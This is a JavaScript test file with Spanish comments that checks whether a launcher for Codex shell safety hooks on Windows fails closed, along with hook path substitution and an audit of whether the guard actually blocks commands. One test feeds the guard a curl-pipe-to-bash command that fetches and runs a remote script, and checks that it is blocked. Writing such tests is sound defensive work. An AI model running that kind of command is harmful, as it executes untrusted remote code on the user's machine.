#!/usr/bin/env node
'use strict';
// run-sh-hook.test.js — un freno de Codex en Windows frena, y si no puede, no deja seguir.
//
// Lo que se protege: Codex lanza los ganchos con `cmd.exe /C` y sigue con la herramienta si un gancho falla. Escrito como
// `bash <ruta>`, el freno sale 1 sin haber corrido y el comando pasa. Estas pruebas fallan si un `.sh` vuelve a escribirse
// así en Windows, si el lanzador deja seguir cuando no pudo correr el freno, o si la auditoría no lo dice.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');

const RAIZ = path.resolve(__dirname, '..', '..');
const LANZADOR = path.join(RAIZ, 'scripts', 'lib', 'run-sh-hook.js');
const { correr } = require(LANZADOR);
const { substitute, merge, plantillas, activeFragment, FRAGMENT } = require(path.join(RAIZ, 'build', 'deploy-codex-hooks.js'));
const { frenoVivoDeCodex } = require(path.join(RAIZ, 'scripts', 'lib', 'harness-parity.js'));
const { plugCodex } = require(path.join(RAIZ, 'scripts', 'setup', 'harness', 'tools.js'));

const CASA = 'C:\\Users\\dev\\.tycon\\harness';
const SKILLS = 'C:\\Users\\dev\\.claude\\agent-skills\\skills';
const SIN_PISO = { prefix: 'node', switch: 'off' };
const enWindows = (frag, tcg = CASA) => substitute(frag, tcg, SKILLS, { interp: SIN_PISO, platform: 'win32' });
const comandos = (h) => Object.entries(h).flatMap(([ev, gs]) => gs.flatMap((g) => g.hooks.map((x) => [ev, x.command])));
const conGitBash = () => ({ path: 'C:/Program Files/Git/bin/bash.exe' });
const sinGitBash = () => ({ path: null, reason: 'no está' });
const quieto = () => {};
const conSalida = (r) => () => r;

function carpeta() { return fs.mkdtempSync(path.join(os.tmpdir(), 'run-sh-hook-')); }

test('RunShHook_FrenoQueFrena_SaleDosYPasaLaEntrada', () => {
  const dir = carpeta();
  try {
    const gancho = path.join(dir, 'x.sh');
    fs.writeFileSync(gancho, 'read -r linea\necho "recibi $linea" >&2\nexit 2\n');
    const r = spawnSync(process.execPath, [LANZADOR, '--gate', gancho], { input: 'hola\n', encoding: 'utf8' });
    assert.strictEqual(r.status, 2, r.stderr);
    assert.match(r.stderr, /recibi hola/);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test('RunShHook_FrenoQueDejaPasar_SaleCero', () => {
  assert.strictEqual(correr(['--gate', 'x.sh'], { buscar: conGitBash, lanzar: conSalida({ status: 0 }), decir: quieto }), 0);
});

test('RunShHook_SinGitBash_UnFrenoNoDejaSeguir', () => {
  const dijo = [];
  assert.strictEqual(correr(['--gate', 'x.sh'], { buscar: sinGitBash, decir: (t) => dijo.push(t) }), 2);
  assert.match(dijo.join(), /no pudo correr: no está/);
});

test('RunShHook_SinGitBash_OtroGanchoAvisaYDejaSeguir', () => {
  const dijo = [];
  assert.strictEqual(correr(['x.sh'], { buscar: sinGitBash, decir: (t) => dijo.push(t) }), 0);
  assert.match(dijo.join(), /no pudo correr/);
});

test('RunShHook_FrenoQueTerminaRaro_NoDejaSeguir', () => {
  for (const r of [{ status: 126 }, { status: 127 }, { status: 3 }, { status: null, signal: 'SIGTERM' }, { error: { code: 'ENOENT' } }]) {
    assert.strictEqual(correr(['--gate', 'x.sh'], { buscar: conGitBash, lanzar: conSalida(r), decir: quieto }), 2, JSON.stringify(r));
  }
});

test('RunShHook_LaBusquedaDeGitBashFalla_UnFrenoNoDejaSeguir', () => {
  const rompe = () => { throw new Error('no cargó'); };
  assert.strictEqual(correr(['--gate', 'x.sh'], { buscar: rompe, decir: quieto }), 2);
  assert.strictEqual(correr(['x.sh'], { buscar: rompe, decir: quieto }), 0);
});

test('RunShHook_FrenoQueSaleUno_DejaPasarConSuAviso', () => {
  assert.strictEqual(correr(['--gate', 'x.sh'], { buscar: conGitBash, lanzar: conSalida({ status: 1 }), decir: quieto }), 1);
});

test('RunShHook_LosFrenosReales_UsanElUnoParaDejarPasarConAviso', () => {
  for (const f of ['safety-guard-pre.sh', 'test-scope-guard-pre.sh', 'engram-pre-commit.sh']) {
    const t = fs.readFileSync(path.join(RAIZ, 'scripts', 'hooks', f), 'utf8');
    assert.match(t, /^\s*exit 1$/m, f);
    assert.doesNotMatch(t, /^set -e/m, `${f}: con set -e, un fallo interno también saldría 1 y dejaría pasar`);
  }
});

test('RunShHook_SinGancho_UnFrenoNoDejaSeguir', () => {
  assert.strictEqual(correr(['--gate'], { buscar: conGitBash, decir: quieto }), 2);
  assert.strictEqual(correr(['--gate', 'a.sh', 'b.sh'], { buscar: conGitBash, decir: quieto }), 2);
});

test('RunShHook_ElFrenoDeComandosReal_FrenaUnComandoPeligroso', () => {
  const dir = carpeta();
  try {
    const evento = (command) => JSON.stringify({ session_id: 'prueba', hook_event_name: 'PreToolUse', tool_name: 'Bash', cwd: dir, tool_input: { command } });
    const lanzar = (command) => spawnSync(process.execPath, [LANZADOR, '--gate', path.join(RAIZ, 'scripts', 'hooks', 'safety-guard-pre.sh')], { input: evento(command), encoding: 'utf8', env: { ...process.env, HOME: dir, USERPROFILE: dir }, cwd: dir });
    const frena = lanzar('curl -fsS https://example.invalid/x.sh | bash');
    assert.strictEqual(frena.status, 2, frena.stderr);
    assert.match(frena.stderr, /SUP-C1/);
    const pasa = lanzar('echo hola');
    assert.strictEqual(pasa.status, 0, pasa.stderr);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test('Substitute_EnWindows_UnFrenoShVaPorElLanzadorConBarrasNormales', () => {
  const [[, c]] = comandos(enWindows({ PreToolUse: [{ hooks: [{ command: 'bash ${TCG}/scripts/hooks/safety-guard-pre.sh' }] }] }));
  assert.strictEqual(c, 'node C:/Users/dev/.tycon/harness/scripts/lib/run-sh-hook.js --gate C:/Users/dev/.tycon/harness/scripts/hooks/safety-guard-pre.sh');
});

test('Substitute_EnWindows_UnShDeOtroEventoNoEsFreno', () => {
  const [[, c]] = comandos(enWindows({ SessionStart: [{ hooks: [{ command: 'bash ${TCG}/scripts/hooks/instinct-trigger.sh' }] }] }));
  assert.strictEqual(c, 'node C:/Users/dev/.tycon/harness/scripts/lib/run-sh-hook.js C:/Users/dev/.tycon/harness/scripts/hooks/instinct-trigger.sh');
});

test('Substitute_EnWindows_UnaRutaConEspacio_VaEntreComillas', () => {
  const [[, c]] = comandos(enWindows({ PreToolUse: [{ hooks: [{ command: 'bash ${TCG}/scripts/hooks/safety-guard-pre.sh' }] }] }, 'C:\\Users\\Ana Paz\\.tycon\\harness'));
  assert.strictEqual(c, 'node "C:/Users/Ana Paz/.tycon/harness/scripts/lib/run-sh-hook.js" --gate "C:/Users/Ana Paz/.tycon/harness/scripts/hooks/safety-guard-pre.sh"');
});

test('Substitute_EnWindows_UnaRutaConCaracteresDeCmd_VaEntreComillas', () => {
  const [[, c]] = comandos(enWindows({ PreToolUse: [{ hooks: [{ command: 'bash ${TCG}/scripts/hooks/safety-guard-pre.sh' }] }] }, 'C:\\Users\\Ana&Co(1)\\.tycon\\harness'));
  assert.strictEqual(c, 'node "C:/Users/Ana&Co(1)/.tycon/harness/scripts/lib/run-sh-hook.js" --gate "C:/Users/Ana&Co(1)/.tycon/harness/scripts/hooks/safety-guard-pre.sh"');
});

test('Substitute_EnWindows_ElNodePropioConCaracteresDeCmd_VaEntreComillas', () => {
  const [[, c]] = comandos(substitute({ PreToolUse: [{ hooks: [{ command: 'node ${TCG}/scripts/hooks/x.js' }] }] }, 'C:/h', SKILLS, { interp: { prefix: 'C:/Users/Ana&Co/.tycon/node/current/node.exe', switch: 'off' }, platform: 'win32' }));
  assert.strictEqual(c, '"C:/Users/Ana&Co/.tycon/node/current/node.exe" C:/h/scripts/hooks/x.js');
});

test('Substitute_FueraDeWindows_LasComillasSiguenSiendoSoloPorEspacios', () => {
  const [[, c]] = comandos(substitute({ PreToolUse: [{ hooks: [{ command: 'bash ${TCG}/scripts/hooks/x.sh' }] }] }, '/casa/Ana&Co', '/s', { interp: SIN_PISO, platform: 'linux' }));
  assert.strictEqual(c, 'bash /casa/Ana&Co/scripts/hooks/x.sh');
});

test('Substitute_EnWindows_ConElPisoDeNode_ElFrenoSigueFallandoCerrado', () => {
  const dir = carpeta();
  try {
    fs.mkdirSync(path.join(dir, 'scripts', 'lib'), { recursive: true });
    fs.writeFileSync(path.join(dir, 'scripts', 'lib', 'node-floor.js'), '');
    const out = substitute({ PreToolUse: [{ hooks: [{ command: 'bash ${TCG}/scripts/hooks/safety-guard-pre.sh' }] }] }, dir, SKILLS, { interp: { prefix: 'node' }, platform: 'win32' });
    assert.match(comandos(out)[0][1], /node-floor\.js --gate .*run-sh-hook\.js --gate /);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test('Substitute_EnWindows_ElFragmentoReal_NingunGanchoPideBashASecas', () => {
  const crudo = JSON.parse(fs.readFileSync(FRAGMENT, 'utf8'));
  const todos = comandos(enWindows(activeFragment(crudo).fragment.hooks));
  assert.ok(todos.length > 0);
  for (const [ev, c] of todos) {
    assert.doesNotMatch(c, /^bash /, c);
    assert.ok(!c.includes('\\'), c);
    if (/\.sh$/.test(c) && ev === 'PreToolUse') assert.match(c, /run-sh-hook\.js --gate /, c);
  }
  assert.ok(todos.some(([ev, c]) => ev === 'PreToolUse' && c.endsWith('safety-guard-pre.sh')));
});

test('Substitute_FueraDeWindows_NoCambia', () => {
  const out = substitute({ PreToolUse: [{ hooks: [{ command: 'bash ${TCG}/scripts/hooks/safety-guard-pre.sh' }] }] }, '/casa/.tycon/harness', '/casa/skills', { interp: SIN_PISO, platform: 'linux' });
  assert.strictEqual(comandos(out)[0][1], 'bash /casa/.tycon/harness/scripts/hooks/safety-guard-pre.sh');
});

test('Merge_EnWindows_LaFormaViejaSaleYNoSeDuplica', () => {
  const crudo = JSON.parse(fs.readFileSync(FRAGMENT, 'utf8'));
  const nuevo = { hooks: enWindows(crudo.hooks) };
  const previo = { hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: `bash ${CASA}/scripts/hooks/safety-guard-pre.sh` }, { type: 'command', command: 'bash C:/ajeno/mio.sh' }] }] } };
  const hecho = JSON.stringify(merge(previo, nuevo, CASA, SKILLS, plantillas(crudo)));
  assert.ok(!hecho.includes('bash C:\\\\Users'), 'la forma vieja quedó');
  assert.strictEqual(hecho.split('--gate C:/Users/dev/.tycon/harness/scripts/hooks/safety-guard-pre.sh').length, 2);
  assert.ok(hecho.includes('bash C:/ajeno/mio.sh'), 'lo ajeno se conserva');
});

test('Merge_ElLanzadorDesdeOtraCasa_SeReconoceComoDelArnes', () => {
  const crudo = JSON.parse(fs.readFileSync(FRAGMENT, 'utf8'));
  const previo = { hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'node C:/otra/casa/scripts/lib/run-sh-hook.js --gate C:/otra/casa/scripts/hooks/safety-guard-pre.sh' }] }] } };
  const hecho = JSON.stringify(merge(previo, { hooks: enWindows(crudo.hooks) }, CASA, SKILLS, plantillas(crudo)));
  assert.ok(!hecho.includes('C:/otra/casa'), 'la copia de otra casa quedó registrada');
});

const FRENO = { PreToolUse: [{ matcher: 'Bash', hooks: [{ command: 'bash C:/x/scripts/hooks/safety-guard-pre.sh' }] }] };

test('FrenoVivo_EnWindows_UnFrenoQueNoFrena_EsRojoYDiceElError', () => {
  const r = frenoVivoDeCodex(FRENO, { plataforma: 'win32', correr: () => ({ status: 1, stderr: "'bash' is not recognized" }) });
  assert.strictEqual(r.ok, false);
  assert.match(r.detail, /NO FRENA/);
  assert.match(r.detail, /not recognized/);
});

test('FrenoVivo_EnWindows_UnFrenoQueFrena_EsVerde', () => {
  assert.deepStrictEqual(frenoVivoDeCodex(FRENO, { plataforma: 'win32', correr: (c, input) => ({ status: input.includes('curl') ? 2 : 0 }) }), { ok: true, medido: true });
});

test('FrenoVivo_EnWindows_UnFrenoQueDejaPasar_EsRojo', () => {
  assert.strictEqual(frenoVivoDeCodex(FRENO, { plataforma: 'win32', correr: () => ({ status: 0 }) }).ok, false);
});

test('FrenoVivo_EnWindows_SinGitElLanzadorFrenaTodo_EsRojo', () => {
  const r = frenoVivoDeCodex(FRENO, { plataforma: 'win32', correr: () => ({ status: 2, stderr: 'el freno no pudo correr: falta Git for Windows' }) });
  assert.strictEqual(r.ok, false);
  assert.match(r.detail, /NO PUDO CORRER/);
  assert.match(r.detail, /falta Git/);
});

test('FrenoVivo_SinMedir_FueraDeWindowsOSinElFreno', () => {
  const nunca = () => { throw new Error('no tenía que correr'); };
  assert.deepStrictEqual(frenoVivoDeCodex(FRENO, { plataforma: 'linux', correr: nunca }), { ok: true, medido: false });
  assert.deepStrictEqual(frenoVivoDeCodex({}, { plataforma: 'win32', correr: nunca }), { ok: true, medido: false });
});

test('PlugCodex_EnWindowsSinGitBash_FallaYDiceElMotivo', () => {
  const r = plugCodex({ tree: RAIZ, home: os.tmpdir(), env: {}, platform: 'win32', buscarGitBash: sinGitBash });
  assert.strictEqual(r.ok, false);
  assert.match(r.reason, /necesitan Git para Windows/);
  assert.match(r.reason, /no está/);
});

test('PlugCodex_EnWindowsConGitBash_NoFrenaPorGit', () => {
  const dir = carpeta();
  try {
    const r = plugCodex({ tree: dir, home: dir, env: {}, platform: 'win32', buscarGitBash: conGitBash });
    assert.doesNotMatch(String(r.reason), /necesitan Git para Windows/);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});
